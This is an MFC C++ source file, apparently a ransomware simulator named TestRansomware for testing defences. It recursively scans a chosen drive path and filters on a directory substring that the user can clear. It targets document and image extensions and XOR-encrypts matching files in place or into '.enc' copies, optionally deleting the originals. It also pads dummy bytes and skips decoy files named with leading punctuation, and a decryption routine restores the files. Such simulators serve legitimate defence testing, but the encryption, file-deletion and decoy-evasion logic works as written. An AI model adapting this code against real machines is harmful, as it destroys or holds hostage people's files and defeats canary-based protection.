
// TestRansomwareDlg.cpp : 구현 파일
//

#include "stdafx.h"
#include "TestRansomware.h"
#include "TestRansomwareDlg.h"
#include "afxdialogex.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

HWND hWnd;
CTestRansomwareDlg *g_pParent;

SYSTEMTIME g_time; // 시간 구조체.

MMRESULT g_idMNTimer1; // 타이머 핸들러
void CALLBACK OnTimerFunc(UINT wTimerID, UINT msg, DWORD dwUser, DWORD dw1, DWORD dw2);

CWinThread*	pThreadSearchFiles = NULL;
CWinThread*	pThreadEncryptFiles = NULL;
static volatile bool g_isSearchFiles;
static volatile bool g_isEncryptFiles;

void WaitG(double dwMillisecond);

// CTestRansomwareDlg 대화 상자



CTestRansomwareDlg::CTestRansomwareDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(IDD_TESTRANSOMWARE_DIALOG, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CTestRansomwareDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST1, ctr_listLog);
	DDX_Control(pDX, IDC_EDIT1, ctr_editFilter);
	DDX_Control(pDX, IDC_STATIC_Status, ctr_staticStatus);
	DDX_Control(pDX, IDC_STATIC_Status2, ctr_staticStatus2);
	DDX_Control(pDX, IDC_EDIT2, ctr_editPath);
}

BEGIN_MESSAGE_MAP(CTestRansomwareDlg, CDialogEx)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BUTTON1, &CTestRansomwareDlg::OnBnClickedButton1)
	ON_BN_CLICKED(IDC_BUTTON2, &CTestRansomwareDlg::OnBnClickedButton2)
	ON_NOTIFY(LVN_GETDISPINFO, IDC_LIST1, &CTestRansomwareDlg::OnLvnGetdispinfoList1)
	ON_WM_TIMER()
	ON_BN_CLICKED(IDC_BUTTON3, &CTestRansomwareDlg::OnBnClickedButton3)
	ON_WM_DESTROY()
END_MESSAGE_MAP()


// CTestRansomwareDlg 메시지 처리기

BOOL CTestRansomwareDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 이 대화 상자의 아이콘을 설정합니다.  응용 프로그램의 주 창이 대화 상자가 아닐 경우에는
	//  프레임워크가 이 작업을 자동으로 수행합니다.
	SetIcon(m_hIcon, TRUE);			// 큰 아이콘을 설정합니다.
	SetIcon(m_hIcon, FALSE);		// 작은 아이콘을 설정합니다.

	// TODO: 여기에 추가 초기화 작업을 추가합니다.
	hWnd = AfxGetMainWnd()->m_hWnd; // GET MAIN HANDLE
	g_pParent = this; // 부모 개체 정의

	TCHAR szPath[_MAX_PATH];
	GetModuleFileName(AfxGetInstanceHandle(), szPath, _MAX_PATH); // 현재 실행파일 경로 구하기
	appPath = szPath;
	int nPos = appPath.ReverseFind('\\'); // 실행파일 경로에서 파일명 제외
	if (nPos > 0)
		appPath = appPath.Left(nPos);

	ctr_listLog.DeleteAllItems(); // 모든 아이템 삭제
	ctr_listLog.SetExtendedStyle(LVS_EX_GRIDLINES | LVS_EX_FULLROWSELECT | LVS_EX_DOUBLEBUFFER); // List Control 스타일 설정

	ctr_listLog.InsertColumn(0, _T("Time"), LVCFMT_LEFT, 65, -1);
	ctr_listLog.InsertColumn(1, _T("Log"), LVCFMT_LEFT, 390, -1);

	ctr_editPath.SetWindowTextA("C:\\");
	ctr_editFilter.SetWindowTextA("\\RansomwareTest");

	AddCheckFileExtension("txt");
	AddCheckFileExtension("doc");
	AddCheckFileExtension("docx");
	AddCheckFileExtension("ppt");
	AddCheckFileExtension("pptx");
	AddCheckFileExtension("xls");
	AddCheckFileExtension("xlsx");
	AddCheckFileExtension("hwp");
	AddCheckFileExtension("pdf");
	AddCheckFileExtension("jpg");
	AddCheckFileExtension("gif");
	AddCheckFileExtension("bmp");

	m_isRunningFindFiles = false;

	m_numTotal = 0;
	m_numInfected = 0;
	m_isEncryptReady = false;

	m_cryptKey = 0x32;
	m_cryptOffset = 0;
	m_cryptType = 0;
	m_cryptInterval = 0;
	m_nDummyByte = 0;
	m_bBypassDecoy = false;
	m_bSaltXOR = false;

	m_nSaltXOR = 0;


	// CRITICAL SECTION - Initial
	InitializeCriticalSection(&m_csFileLog);
	InitializeCriticalSection(&m_csFileQueue);

	SetTimer(1, 1000, 0); // 패킷 카운트 타이머
	ctr_staticStatus.SetWindowTextA("Ready");

	/********** 멀티미디어 타이머 시작 **********/
	//System에서 가능한 Resolution을 구한다.
	//멀티미디어 타이머의 Resolution을 최소로 하기 위한 코드    
	TIMECAPS tc;
	timeGetDevCaps(&tc, sizeof(TIMECAPS));
	unsigned int Resolution = min(max(tc.wPeriodMin, 0), tc.wPeriodMax);
	timeBeginPeriod(Resolution);

	//멀티미디어 타이머 생성
	g_idMNTimer1 = timeSetEvent(
		50,         //Timer Delay(ms)
		Resolution,  //delay의 정확도를 의미
		OnTimerFunc,  //callback Function
		(DWORD)this,   //CallBack에 사용할 전달 인자
		TIME_PERIODIC);  //타이머의 타입(발생시마다 콜백 Call)

	/********** 멀티미디어 타이머 끝 **********/

	return TRUE;  // 포커스를 컨트롤에 설정하지 않으면 TRUE를 반환합니다.
}

BOOL CTestRansomwareDlg::PreTranslateMessage(MSG* pMsg)
{
	// TODO: 여기에 특수화된 코드를 추가 및/또는 기본 클래스를 호출합니다.

	if (pMsg->message == WM_KEYDOWN)
	{
		// ESC
		if (pMsg->wParam == VK_ESCAPE) {
			return true;
		}

		// Enter
		if (pMsg->wParam == VK_RETURN) {
			return true;
		}
	}

	return CDialogEx::PreTranslateMessage(pMsg);
}

// 대화 상자에 최소화 단추를 추가할 경우 아이콘을 그리려면
//  아래 코드가 필요합니다.  문서/뷰 모델을 사용하는 MFC 응용 프로그램의 경우에는
//  프레임워크에서 이 작업을 자동으로 수행합니다.

void CTestRansomwareDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 그리기를 위한 디바이스 컨텍스트입니다.

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 클라이언트 사각형에서 아이콘을 가운데에 맞춥니다.
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 아이콘을 그립니다.
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

// 사용자가 최소화된 창을 끄는 동안에 커서가 표시되도록 시스템에서
//  이 함수를 호출합니다.
HCURSOR CTestRansomwareDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}


void CTestRansomwareDlg::OnTimer(UINT_PTR nIDEvent)
{
	// TODO: 여기에 메시지 처리기 코드를 추가 및/또는 기본값을 호출합니다.
	if (nIDEvent == 1)
	{
	}

	CDialogEx::OnTimer(nIDEvent);
}


void CALLBACK OnTimerFunc(UINT wTimerID, UINT msg, DWORD dwUser, DWORD dw1, DWORD dw2)
{
	CTestRansomwareDlg* pDlg = (CTestRansomwareDlg*)dwUser;

	//if (wTimerID == 1) {
	if (pDlg->m_isRunningFindFiles) {
		pDlg->UpdateLogList();
	}
	//}
}


void CTestRansomwareDlg::OnDestroy()
{
	CDialogEx::OnDestroy();

	// TODO: 여기에 메시지 처리기 코드를 추가합니다.

	// CRITICAL SECTION - Delete
	DeleteCriticalSection(&m_csFileLog);
	DeleteCriticalSection(&m_csFileQueue);

}


void CTestRansomwareDlg::AddLogList(CString msg, bool wTime)
{
	int listNum;
	CString strTime;

	::ZeroMemory(reinterpret_cast<void*>(&g_time), sizeof(g_time)); // time 초기화.
	::GetLocalTime(&g_time);    // 현재시간을 얻음.

	FILE_LOG tmpFileLog;

	strTime.Format("%02d:%02d:%02d", g_time.wHour, g_time.wMinute, g_time.wSecond);

	tmpFileLog.timeStamp.SetString(strTime);
	tmpFileLog.strPath.SetString(msg);
	
	if(m_isRunningFindFiles)
		EnterCriticalSection(&m_csFileLog);

	m_listFileLog.push_back(tmpFileLog);

	if (m_isRunningFindFiles)
		LeaveCriticalSection(&m_csFileLog);
}


void CTestRansomwareDlg::UpdateLogList()
{
	int listNum;
	CString strMsg;

	EnterCriticalSection(&m_csFileLog);
	ctr_listLog.SetItemCountEx(m_listFileLog.size(), LVSICF_NOINVALIDATEALL | LVSICF_NOSCROLL);

	listNum = m_listFileLog.size() - 1;
	ctr_listLog.EnsureVisible(listNum, false);

	strMsg.Format("Infected: %d / Total: %d", m_numInfected, m_numTotal);
	ctr_staticStatus2.SetWindowTextA(strMsg);
	LeaveCriticalSection(&m_csFileLog);
}


// 파일 암호화 스레드
static UINT EncryptTargetFiles(LPVOID lpParam)
{
	CTestRansomwareDlg* pDlg = (CTestRansomwareDlg*)lpParam;

	bool result;
	CString strPath;
	queue<CString> *queueTarget = (queue<CString>*)&pDlg->m_queueTargetFiles;
	
	while (1) {
		result = false;

		EnterCriticalSection(&pDlg->m_csFileQueue);
		if (!queueTarget->empty()) {
			strPath = queueTarget->front();
			queueTarget->pop();
			result = true;
		}
		else {
			if (!pDlg->m_isRunningFindFiles) {
				LeaveCriticalSection(&pDlg->m_csFileQueue);
				break;
			}
		}
		LeaveCriticalSection(&pDlg->m_csFileQueue);

		if(result == true){
			// 암호화 수행
			if (pDlg->EncryptFileRs(strPath) == true)
				pDlg->m_numInfected++;
			pDlg->m_isEncryptReady = false;
			pDlg->UpdateLogList();
		}

		// 대기
		if (pDlg->m_cryptInterval > 0 && pDlg->m_isEncryptReady == false){
			WaitG(pDlg->m_cryptInterval);
			pDlg->m_isEncryptReady = true;
		}
		else{
			Sleep(1);
		}
	}

	pThreadEncryptFiles = NULL;
	return 0;
}


// 파일 검색 스레드
static UINT SearchTargetFiles(LPVOID lpParam)
{
	FIND_FILE_INFO *param = (FIND_FILE_INFO*)lpParam;
	CTestRansomwareDlg* pDlg = (CTestRansomwareDlg*)param->param;

	CString strTemp;

	pDlg->m_numTotal = 0;
	pDlg->m_numInfected = 0;
	pDlg->m_listFileLog.clear();
	pDlg->UpdateLogList();

	pDlg->ctr_staticStatus.SetWindowTextA("Running...");
	strTemp.Format("========== 검색 시작 ==========");
	pDlg->AddLogList(strTemp);

	pDlg->m_isRunningFindFiles = true;

	pThreadEncryptFiles = AfxBeginThread(EncryptTargetFiles, (LPVOID)pDlg, THREAD_PRIORITY_NORMAL, 0, 0);
	if (pThreadEncryptFiles == NULL) {
		AfxMessageBox("[Error] Fail to create 'EncryptTargetFiles' thread.", true);
		return 0;
	}

	pDlg->FindFiles(param->strPath);
	pDlg->m_isRunningFindFiles = false;

	pDlg->ctr_staticStatus.SetWindowTextA("Encrypting file...");

	if(pThreadEncryptFiles != NULL)
		WaitForSingleObject(pThreadEncryptFiles->m_hThread, INFINITE);

	pDlg->CreateListFile();
	pDlg->UpdateLogList();
	pDlg->ctr_staticStatus.SetWindowTextA("Complete");

	pThreadSearchFiles = NULL;
	return 0;
}


void CTestRansomwareDlg::OnBnClickedButton1()
{
	// TODO: 여기에 컨트롤 알림 처리기 코드를 추가합니다.
	int nResult;
	CString strPath;
	CString strMsg;
	FIND_FILE_INFO *param = new FIND_FILE_INFO;

	if (m_isRunningFindFiles)
		return;

	// 검색 범위 지정
	ctr_editPath.GetWindowTextA(strPath);
	if (strPath.GetAt(strPath.GetLength() - 1) != '\\') {
		strPath += '\\';
		ctr_editPath.SetWindowTextA(strPath);
	}

	// 타겟 디렉토리 지정
	ctr_editFilter.GetWindowTextA(m_strFilter);
	if (m_strFilter.IsEmpty() || m_strFilter.Trim().GetLength() < 4) {
		if (IDNO == AfxMessageBox("[Warning] Filter is empty.", MB_YESNO))
			return;
	}

	param->type = 0;
	param->strPath = strPath;
	param->param = this;

	pThreadSearchFiles = AfxBeginThread(SearchTargetFiles, (LPVOID)param, THREAD_PRIORITY_NORMAL, 0, 0);
	if (pThreadSearchFiles == NULL) {
		AfxMessageBox("[Error] Fail to create 'SearchTargetFiles' thread.", true);
		return;
	}
}


void CTestRansomwareDlg::OnBnClickedButton2()
{
	// TODO: 여기에 컨트롤 알림 처리기 코드를 추가합니다.

	if (m_isRunningFindFiles)
		return;

	DecryptFileRs();

	bool result;
}


void CTestRansomwareDlg::OnBnClickedButton3()
{
	// TODO: 여기에 컨트롤 알림 처리기 코드를 추가합니다.
	if (m_pSettingRansomwareDlg.GetSafeHwnd() == NULL) {
		m_pSettingRansomwareDlg.DoModal();
	}
}


inline void WaitG(double dwMillisecond)
{
	MSG msg;
	LARGE_INTEGER   st, ed, freq;
	double			WaitFrequency;
	QueryPerformanceFrequency(&freq);
	WaitFrequency = ((double)dwMillisecond / 1000) * ((double)freq.QuadPart);

	if (freq.QuadPart == 0)
	{
		//::SetDlgItemText(hWnd,IDC_EDIT_Status,"Warning! - 고해상도 타이머 지원 안함.");
		//AddListLog(1, "지원 안함.");
		return;
	}

	QueryPerformanceCounter(&st);
	QueryPerformanceCounter(&ed);
	while ((double)(ed.QuadPart - st.QuadPart) < WaitFrequency)
	{
		while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE))
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
		Sleep(1);

		QueryPerformanceCounter(&ed);
	}
}


bool CTestRansomwareDlg::FindFiles(LPCTSTR szFilePath)
{
	HANDLE hFind;
	WIN32_FIND_DATA fd = { 0 };
	char szFindFilter[MAX_PATH + 1] = { 0 };
	char szSrcFile[MAX_PATH + 1] = { 0 };
	char chTemp;
	BOOL bFileFind = FALSE;
	CString strTemp;
	bool result;

	sprintf(szFindFilter, _T("%s\\*.*"), szFilePath);
	hFind = ::FindFirstFile(szFindFilter, &fd);
	if (hFind != INVALID_HANDLE_VALUE)
	{
		do
		{
			if (fd.cFileName[0] == '.')
				continue;
			sprintf(szSrcFile, _T("%s%s"), szFilePath, fd.cFileName);
			if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				strcat(szSrcFile, "\\");
				strTemp.Format("%s\n", szSrcFile);
				AddLogList(strTemp);
				bFileFind = FindFiles(szSrcFile);
			}
			else
			{
				m_numTotal++;
				if (m_bBypassDecoy) {
					strTemp = PathFindFileName(szSrcFile);
					chTemp = strTemp.GetAt(0);
					if (chTemp >= '!' && chTemp <= '/')
						continue;
				}

				if (strstr(szSrcFile, (LPSTR)(LPCTSTR)m_strFilter)) {
					strTemp = szSrcFile;
					if(CheckFileExtension(strTemp) == true){
						// 감염 대상 파일 큐에 추가
						EnterCriticalSection(&m_csFileQueue);
						m_queueTargetFiles.push(szSrcFile);
						LeaveCriticalSection(&m_csFileQueue);
					}
				}
			}
		} while (::FindNextFile(hFind, &fd));
		::FindClose(hFind);
	}
	return true;
}


void CTestRansomwareDlg::OnLvnGetdispinfoList1(NMHDR *pNMHDR, LRESULT *pResult)
{
	NMLVDISPINFO *pDispInfo = reinterpret_cast<NMLVDISPINFO*>(pNMHDR);
	// TODO: 여기에 컨트롤 알림 처리기 코드를 추가합니다.

	//Create a pointer to the item
	LV_ITEM* pItem = &(pDispInfo)->item;

	//Which item number?
	int itemid = pItem->iItem;

	if (m_listFileLog.size() <= itemid)
		return;

	if (pItem->mask & LVIF_TEXT)
	{
		CString text;

		//Which column?
		if (pItem->iSubItem == 0) {	// TimeStamp
			text = m_listFileLog[itemid].timeStamp;
		}
		else if (pItem->iSubItem == 1) {	// Content
			text = m_listFileLog[itemid].strPath;
		}

		//Copy the text to the LV_ITEM structure
		//Maximum number of characters is in pItem->cchTextMax
		lstrcpyn(pItem->pszText, text, pItem->cchTextMax);

	}

	*pResult = 0;
}

bool CTestRansomwareDlg::AddCheckFileExtension(CString StrExt)
{
	bool result;
	list<CString>::iterator itor = m_listFileExt.begin();

	// 중복 검사
	while (itor != m_listFileExt.end()){
		if (StrExt.Compare(*itor) == 0) {
			return false;
		}
		itor++;
	}

	m_listFileExt.push_back(StrExt);

	return true;
}


// 감염된 파일 리스트 추가
bool CTestRansomwareDlg::AddInfectedFile(CString StrPath)
{
	bool result;
	list<CString>::iterator itor = m_listInfectedFiles.begin();

	// 중복 검사
	while (itor != m_listInfectedFiles.end()) {
		if (StrPath.Compare(*itor) == 0) {
			return false;
		}
		itor++;
	}

	m_listInfectedFiles.push_back(StrPath);

	return true;
}

bool CTestRansomwareDlg::CreateListFile()
{
	FILE* fp;
	CString strPath;
	strPath.Format("%s\\RsList.txt", appPath);

	fp = fopen((LPSTR)(LPCTSTR)strPath, "w");
	if (fp == NULL)
		return false;

	list<CString>::iterator itor = m_listInfectedFiles.begin();
	while (itor != m_listInfectedFiles.end())
	{
		fprintf(fp, "%s\n", (LPSTR)(LPCTSTR)*itor);
		itor++;
	}

	fclose(fp);
	return true;
}

bool CTestRansomwareDlg::CheckFileExtension(CString strPath)
{
	char ex[255];
	CString strExt;

	int i = strPath.ReverseFind('.');
	if (i > -1)
		strExt = strPath.Right(strPath.GetLength() - i - 1);

	list<CString>::iterator itor = m_listFileExt.begin();
	while (itor != m_listFileExt.end())
	{
		if (strExt.Compare(*itor) == 0) {
			return true;
		}
		itor++;
	}

	return false;
}


bool CTestRansomwareDlg::EncryptFileRs(CString strPath)
{
	FILE* source;
	FILE* dest;
	size_t size;
	int cur;
	int bEof;
	unsigned char buf[FILE_BUF_SIZE];
	CString strPath2 = strPath + ".enc";

	source = fopen((LPSTR)(LPCTSTR)strPath, "rb+");
	if (source == NULL)
		return false;
	if(m_cryptType > 1)
		dest = fopen((LPSTR)(LPCTSTR)strPath2, "wb");

	m_nSaltXOR = 0;

	while (size = fread(buf, 1, FILE_BUF_SIZE, source)) {
		cur = ftell(source) + (-1)*size;
		for (int i = 0; i < size; i++){
			if (cur + i < m_cryptOffset) continue;
			buf[i] = buf[i] ^ (unsigned char)(m_nSaltXOR + m_cryptKey); // XOR
			if (m_bSaltXOR) m_nSaltXOR++;
		}
		if (m_cryptType == 0 || m_cryptType == 1) {
			bEof = feof(source);
			fseek(source, (-1)*size, SEEK_CUR);
			fwrite(buf, 1, size, source);
			if (bEof != 0) {
				// Dummy byte
				if(m_nDummyByte > 0){
					if (m_nDummyByte > FILE_BUF_SIZE)
						m_nDummyByte = FILE_BUF_SIZE;
					memset(buf, 0, m_nDummyByte);
					fwrite(buf, 1, m_nDummyByte, source);
				}
				break; // EOF
			}
		}else{
			fwrite(buf, 1, size, dest);
		}
	}

	fclose(source);
	if (m_cryptType > 1)
		fclose(dest);
	
	if (m_cryptType == 1) {
		MoveFileEx(strPath, strPath2, MOVEFILE_COPY_ALLOWED); // 파일 이름 변경
	}
	else if (m_cryptType == 2) {
		DeleteFile(strPath); // 원본 파일 삭제
	}
	else if (m_cryptType == 3) {
		// 원본 덮어쓰기
		DeleteFile(strPath); // 원본 파일 삭제
	}

	// 감염 파일 목록 추가
	if (m_cryptType == 0)
		AddInfectedFile(strPath);
	else
		AddInfectedFile(strPath2);

	return true;
}

bool CTestRansomwareDlg::DecryptFileRs()
{
	FILE* fpList;
	FILE* source;
	size_t file_size;
	size_t size;
	int cur;
	int bEof;
	CString strPath;
	CString strPath2;
	CString strTemp;
	strPath.Format("%s\\RsList.txt", appPath);
	char szFilePath[1024];
	unsigned char buf[FILE_BUF_SIZE];

	fpList = fopen((LPSTR)(LPCTSTR)strPath, "r");
	if (fpList == NULL)
		return false;

	strTemp.Format("========== 복구 시작 ==========");
	AddLogList(strTemp);

	while (size = fscanf(fpList, "%s", &szFilePath)){
		if ((int)size <= 0) break;
		source = fopen(szFilePath, "rb+");
		if (source == NULL)
			continue;

		m_nSaltXOR = 0;

		fseek(source, 0, SEEK_END);
		file_size = ftell(source);
		fseek(source, 0, SEEK_SET);

		while (size = fread(buf, 1, FILE_BUF_SIZE, source)) {
			cur = ftell(source) + (-1)*size;
			for (int i = 0; i < size; i++){
				if (cur + i < m_cryptOffset) continue;
				buf[i] = buf[i] ^ (unsigned char)(m_nSaltXOR + m_cryptKey); // XOR
				if (m_bSaltXOR) m_nSaltXOR++;
			}
			bEof = feof(source);
			fseek(source, (-1)*size, SEEK_CUR);
			fwrite(buf, 1, size, source);
			if (bEof != 0)
				break; // EOF
		}
		fclose(source);

		// Dummy byte - Delete
		HANDLE hFile = CreateFile(szFilePath, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_NEW | OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		LARGE_INTEGER ilDistanceToMove;
		ilDistanceToMove.QuadPart = GetFileSize(hFile, NULL) - m_nDummyByte;
		SetFilePointerEx(hFile, ilDistanceToMove, NULL, FILE_BEGIN);
		SetEndOfFile(hFile);
		CloseHandle(hFile);

		// rename
		if (m_cryptType > 0) {
			strPath2 = szFilePath;
			strPath2.Replace(".enc", "");
			DeleteFile(strPath2); // 원본 파일 삭제
			MoveFileEx(szFilePath, strPath2, MOVEFILE_COPY_ALLOWED); // 파일 이름 변경
		}

		strTemp.Format("복구 완료: %s", szFilePath);
		AddLogList(strTemp);
	}

	UpdateLogList();
	fclose(fpList);
	return true;
}